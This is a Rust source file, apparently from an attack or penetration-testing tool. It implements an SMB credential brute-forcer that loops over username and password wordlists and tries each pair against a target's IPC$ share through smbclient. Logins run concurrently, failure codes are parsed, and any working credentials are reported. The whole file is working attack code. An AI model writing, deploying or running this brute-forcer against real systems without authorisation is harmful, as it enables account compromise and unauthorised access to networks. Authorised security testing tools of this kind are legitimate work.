use std::sync::Arc;
use std::time::Duration;
use futures_util::stream::FuturesUnordered;
use futures_util::StreamExt;
use tokio::sync::Semaphore;
use crate::models::Job;
use crate::state::AppState;
use crate::db::repository;
use super::{DEFAULT_PASSWORDS, DEFAULT_USERNAMES, load_wordlist};

pub struct SmbBruteForce;

impl SmbBruteForce {
    pub async fn run(job: &Job, state: &Arc<AppState>) -> Result<String, String> {
        let cfg = job.config.as_object().ok_or("Invalid job config")?;

        let target = cfg["target"].as_str().ok_or("Missing target")?.to_string();
        let port = cfg.get("port").and_then(|v| v.as_u64()).unwrap_or(445) as u16;
        let concurrency = cfg.get("concurrency").and_then(|v| v.as_u64()).unwrap_or(3) as usize;
        let domain = cfg.get("domain").and_then(|v| v.as_str()).unwrap_or("").to_string();

        // SMB auth is delegated to the system `smbclient` (same pattern as nmap).
        // Fail fast with a helpful hint if it isn't installed rather than reporting
        // every credential as a failure.
        if !smbclient_available().await {
            let msg = "smbclient not found — install it to run SMB brute force \
                       (Debian/Pi: `sudo apt-get install smbclient`).";
            let _ = repository::add_log(&state.db, "ERROR", "attacks", Some("smb-brute"), Some(&job.id), msg).await;
            return Err(msg.to_string());
        }

        let usernames = load_wordlist(cfg, "usernames", "usernames_path", DEFAULT_USERNAMES).await;
        let passwords = load_wordlist(cfg, "passwords", "wordlist_path", DEFAULT_PASSWORDS).await;

        let total = usernames.len() * passwords.len();
        let _ = state.broadcaster.send(format!(
            "scan_progress:{}:SMB brute — {} usernames × {} passwords = {} attempts on {}:{}",
            job.id, usernames.len(), passwords.len(), total, target, port
        ));

        let sem = Arc::new(Semaphore::new(concurrency));
        let mut futs = FuturesUnordered::new();

        for username in &usernames {
            for password in &passwords {
                let target = target.clone();
                let domain = domain.clone();
                let username = username.clone();
                let password = password.clone();
                let sem = sem.clone();

                futs.push(async move {
                    let _permit = sem.acquire_owned().await.unwrap();
                    let result = try_smb_login(&target, port, &domain, &username, &password).await;
                    (username, password, result)
                });
            }
        }

        let mut found: Vec<String> = Vec::new();
        let mut attempted: usize = 0;

        while let Some((user, pass, result)) = futs.next().await {
            attempted += 1;

            if attempted % 20 == 0 {
                let _ = state.broadcaster.send(format!(
                    "scan_progress:{}:{}/{} attempts ({} found)",
                    job.id, attempted, total, found.len()
                ));
            }

            if attempted % 10 == 0 {
                if let Ok(Some(j)) = repository::get_job(&state.db, &job.id).await {
                    if j.is_cancelled() {
                        let _ = state.broadcaster.send(format!(
                            "scan_progress:{}:Cancelled after {} attempts", job.id, attempted
                        ));
                        break;
                    }
                }
            }

            match result {
                Ok(true) => {
                    let cred = format!("{}:{}", user, pass);
                    let _ = state.broadcaster.send(format!(
                        "scan_progress:{}:Found credentials: {}", job.id, cred
                    ));
                    found.push(cred);
                }
                Ok(false) => {}
                Err(e) => {
                    tracing::debug!("[smb-brute] {}:{} → {}", user, pass, e);
                }
            }
        }

        let results = serde_json::json!({
            "target": target,
            "port": port,
            "attempts": attempted,
            "found": found,
        });
        Ok(results.to_string())
    }
}

/// True if `smbclient` is on PATH.
async fn smbclient_available() -> bool {
    tokio::process::Command::new("smbclient")
        .arg("--version")
        .output()
        .await
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// Attempt an SMB login by connecting to the IPC$ share with `smbclient`.
/// Exit status 0 means authentication succeeded.
async fn try_smb_login(
    host: &str,
    port: u16,
    domain: &str,
    user: &str,
    pass: &str,
) -> Result<bool, String> {
    let service = format!("//{}/IPC$", host);
    // `user%pass` — an empty password becomes `user%`.
    let auth = format!("{}%{}", user, pass);

    let mut cmd = tokio::process::Command::new("smbclient");
    cmd.arg(&service)
        .args(["-p", &port.to_string()])
        .args(["-U", &auth])
        .args(["-c", "quit"]);
    if !domain.is_empty() {
        cmd.args(["-W", domain]);
    }

    let output = tokio::time::timeout(Duration::from_secs(12), cmd.output())
        .await
        .map_err(|_| "smbclient timeout".to_string())?
        .map_err(|e| format!("failed to run smbclient: {}", e))?;

    if output.status.success() {
        return Ok(true);
    }

    // Distinguish "bad credentials" from a connection/other error for cleaner logs.
    let stderr = String::from_utf8_lossy(&output.stderr);
    if stderr.contains("NT_STATUS_LOGON_FAILURE")
        || stderr.contains("NT_STATUS_ACCESS_DENIED")
        || stderr.contains("NT_STATUS_ACCOUNT")
    {
        Ok(false)
    } else if stderr.trim().is_empty() {
        Ok(false)
    } else {
        Err(stderr.trim().to_string())
    }
}
